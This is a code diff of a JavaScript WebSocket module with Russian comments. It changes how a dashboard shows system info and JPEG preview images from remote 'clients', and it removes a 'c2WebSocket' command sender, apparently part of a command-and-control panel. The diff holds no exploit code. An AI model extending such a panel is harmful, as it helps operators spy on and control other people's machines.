@@ -1,9 +1,8 @@
 // frontend/dashboard/js/modules/websocket/connection.js
 import { updateClient, updateClients, setClientPreview } from '../data/clients.js';
-import { decodePacket, encodePacket } from './protocol.js';
+import { decodePacket } from './protocol.js';
 
 let ws;
-const dec = new TextDecoder();
 
 export const connectWebSocket = () => {
     const t = localStorage.getItem('auth_token'), l = localStorage.getItem('user_login');
@@ -17,27 +16,19 @@ export const connectWebSocket = () => {
         if (!pkg) return;
         const { id, module, payload } = pkg;
 
-        if (module === 'DataScribe' || module === 'SystemInfo') {
-            try {
-                const raw = JSON.parse(dec.decode(payload));
-                Array.isArray(raw) ? updateClients(raw) : updateClient({ ...raw, id });
-            } catch (e) { console.error("[WS] Parse Err", e); }
+        if (module.startsWith('SystemInfo')) {
+            Array.isArray(payload) ? updateClients(payload) : updateClient({ ...payload, id });
         } 
-        
-        if (module === 'Preview') {
-            const url = URL.createObjectURL(new Blob([payload], { type: 'image/jpeg' }));
-            setClientPreview(id, url);
+        else if (module.startsWith('Preview')) {
+            // Теперь payload - это чистый ArrayBuffer из protocol.js
+            const blob = new Blob([payload], { type: 'image/jpeg' });
+            const url = URL.createObjectURL(blob);
             
-            // Быстрое обновление картинки в DOM, если элемент уже отрисован
-            const img = document.getElementById(`prev-${id}`);
-            if (img) { img.src = url; img.style.opacity = "1"; }
+            console.log(`[UI] New Preview for ${id} (${payload.byteLength} bytes)`);
+            setClientPreview(id, url);
         }
     };
 
     ws.onclose = () => setTimeout(connectWebSocket, 5000);
     ws.onopen = () => console.log("🚀 WS Connected");
-
-    window.c2WebSocket = { 
-        send: (id, mod, pay) => ws?.readyState === 1 && ws.send(encodePacket(id, mod, pay)) 
-    };
 };
